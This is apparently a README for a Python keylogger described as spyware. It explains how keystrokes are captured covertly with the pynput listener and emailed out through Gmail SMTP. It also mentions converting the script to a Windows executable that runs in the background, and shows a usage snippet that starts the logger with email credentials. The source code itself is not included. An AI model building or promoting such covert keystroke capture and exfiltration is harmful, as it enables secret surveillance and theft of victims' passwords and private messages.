# Keylogger-Spyware

Keylogger is the action of recording the key strikes on a keyboard so that the person using the keyboard is unaware of their actions that are being monitored.

I created this from my knowledge of python and networking that I learned from Zaid Sabih's Course.I took a help from google regarding the smtp server setup for email reporting.
This uses email and password of a gmail account to send the reports to and it we have to provide the email and password respectively.

SMTP
I used a module named smtplib which helped me create a smtp server and use google's server for reporting.

Keyboard Listener
It uses a pynput module from python which contains both keyboard and mouse listener which records the strikes.
This module has nice documentation at https://pythonhosted.org/pynput/keyboard.html.Please checkout this docs before using it.

We can also convert this python file into a executable which can be run on Windows machine in the background.

I am about to create one and I will upload as soon as I am done.

Usage:
There are two files-
alogger.py
keylogger.py

alogger.py is all about code and keylogger is the file where we have to provide username and password.

######################################################
import alogger

keylogger = alogger.Invoker(100,"Email","Password") # Supply username and password overhere.
keylogger.begin()
######################################################

Make sure before you run the program,your gmail account should enable 'Allow less secure apps' otherwise it wont work.

Thank you :)
Happy Hacking..
